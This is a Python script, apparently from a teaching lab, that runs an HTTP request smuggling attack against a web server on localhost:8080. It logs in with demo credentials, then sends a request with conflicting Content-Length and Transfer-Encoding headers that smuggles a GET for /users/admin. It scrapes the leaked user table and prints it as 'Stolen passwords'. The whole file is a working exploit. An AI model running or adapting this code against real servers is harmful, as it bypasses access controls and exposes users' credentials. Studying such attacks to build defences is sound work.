#!/usr/bin/env python3
import socket
import time
import re

print("\nHTTP REQUEST SMUGGLING ATTACK\n")
input("Press ENTER to start...\n")

login_data = b"username=alice&password=alice123"
login = (
    b"POST /login HTTP/1.1\r\n"
    b"Host: localhost:8080\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n" +
    f"Content-Length: {len(login_data)}\r\n".encode() +
    b"Connection: close\r\n\r\n" +
    login_data
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8080))
sock.sendall(login)
response = sock.recv(8192).decode()
sock.close()

session = None
for line in response.split('\r\n'):
    if 'Set-Cookie: session=' in line:
        session = line.split('session=')[1].split(';')[0]
        break

if not session:
    print("Login failed")
    exit(1)

print(f"[1] Login: {session[:30]}...")

attack = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost:8080\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n" +
    f"Cookie: session={session}\r\n".encode() +
    b"Connection: keep-alive\r\n\r\n"
    b"0\r\n\r\n"
    b"GET /users/admin HTTP/1.1\r\n"
    b"Host: localhost:8080\r\n" +
    f"Cookie: session={session}\r\n".encode() +
    b"Connection: close\r\n\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect(("localhost", 8080))
sock.sendall(attack)

response1 = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response1 += chunk
        if b"\r\n\r\n" in response1:
            headers = response1.split(b"\r\n\r\n")[0]
            if b"Content-Length:" in headers:
                content_length = int([line.split(b": ")[1] for line in headers.split(b"\r\n") if b"Content-Length:" in line][0])
                body_start = response1.find(b"\r\n\r\n") + 4
                if len(response1) >= body_start + content_length:
                    break
    except:
        break

time.sleep(0.5)

response2 = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response2 += chunk
except:
    pass

sock.close()

r2_text = response2.decode('utf-8', errors='ignore')

print("[2] Smuggling attack sent\n")

if "alice123" in r2_text or "admin_secret" in r2_text:
    print("SUCCESS - Stolen passwords:\n")
    
    all_tds = re.findall(r'<td>(.*?)</td>', r2_text, re.DOTALL)
    
    print(f"{'ID':<5} {'Username':<15} {'Email':<25} {'Password':<15} {'Role':<10}")
    print("-" * 75)
    
    for i in range(0, len(all_tds), 5):
        if i + 4 < len(all_tds):
            row = [td.strip() for td in all_tds[i:i+5]]
            password = row[3].replace('<code>', '').replace('</code>', '').strip()
            print(f"{row[0]:<5} {row[1]:<15} {row[2]:<25} {password:<15} {row[4]:<10}")
    print()
else:
    print("FAILED\n")